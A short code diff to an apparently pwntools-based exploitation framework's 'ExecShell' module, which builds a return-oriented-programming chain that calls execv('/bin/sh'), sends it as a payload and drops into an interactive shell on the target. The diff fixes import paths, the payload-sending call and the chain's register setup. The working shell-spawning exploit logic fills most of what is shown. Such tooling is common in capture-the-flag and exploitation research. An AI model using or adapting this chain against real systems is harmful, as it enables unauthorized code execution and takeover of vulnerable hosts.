@@ -1,8 +1,8 @@
 import enum
 import typing
-from core.abstract.module import AbstractModule
-from core.abstract.process import AbstractProcess
-from core.protocols import IRop, ITarget, ILibc
+from pypwn.core.abstract.module import AbstractModule
+from pypwn.core.abstract.process import AbstractProcess
+from pypwn.core.protocols import IRop, ITarget, ILibc
 from pwn import p64
 from loguru import logger
 
@@ -40,7 +40,7 @@ class ExecShell(AbstractModule):
         payload = target.generate_payload(rop_chain, offset, leave, canary)
 
         logger.info(f"Sending payload. Payload size = {hex(len(payload))}")
-        process(target, payload)
+        process(payload)
 
         logger.success(f"Switching to interactive mode")
         process.interactive()
@@ -78,4 +78,4 @@ class ExecShell(AbstractModule):
         logger.info(f"'/bin/sh' ptr {hex(bin_sh_ptr)}")
         logger.info(f"execv ptr {hex(execv_ptr)}")
 
-        return p64(ret) + p64(pop_rdi) + p64(bin_sh_ptr) + p64(pop_rsi) + p64(0) + p64(execv_ptr)
+        return p64(ret) + p64(pop_rdi) + p64(bin_sh_ptr) + p64(pop_rsi) + p64(0) + p64(0) + p64(execv_ptr)
